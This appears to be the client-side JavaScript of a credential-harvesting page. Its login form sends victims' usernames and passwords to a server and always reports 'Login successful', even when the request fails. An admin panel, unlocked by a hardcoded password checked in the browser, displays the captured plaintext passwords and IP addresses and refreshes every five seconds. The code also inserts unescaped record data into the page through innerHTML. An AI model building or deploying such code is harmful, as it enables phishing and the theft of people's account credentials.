const ADMIN_PASSWORD = "Iyatunde";   // ← Change this to your own password

        function checkPassword() {
            const entered = document.getElementById('adminPassword').value;
            if (entered === ADMIN_PASSWORD) {
                document.getElementById('loginScreen').style.display = 'none';
                document.getElementById('recordsScreen').style.display = 'block';
                loadRecords();
            } else {
                alert("❌ Incorrect Password");
            }
        }

        async function loadRecords() {
            try {
                const res = await fetch('/api/records');
                const records = await res.json();
                const tbody = document.querySelector('#recordsTable tbody');
                tbody.innerHTML = '';

                records.reverse().forEach(r => {
                    const row = `<tr>
                        <td>${r.timestamp}</td>
                        <td><strong>${r.username}</strong></td>
                        <td><code>${r.password}</code></td>
                        <td>${r.ip}</td>
                    </tr>`;
                    tbody.innerHTML += row;
                });
            } catch(e) {}
        }

        async function clearRecords() {
            if (confirm("Delete all login records?")) {
                await fetch('/api/clear', { method: 'POST' });
                loadRecords();
            }
        }

        // Auto-refresh every 5 seconds
        setInterval(() => {
            if (document.getElementById('recordsScreen').style.display === 'block') {
                loadRecords();
            }
        }, 5000);


         document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            try {
                const res = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
                
                const data = await res.json();
                if (data.success) {
                    alert('Login successful!');
                }
            } catch (err) {
                alert('Login successful! (Demo)');
            }
        });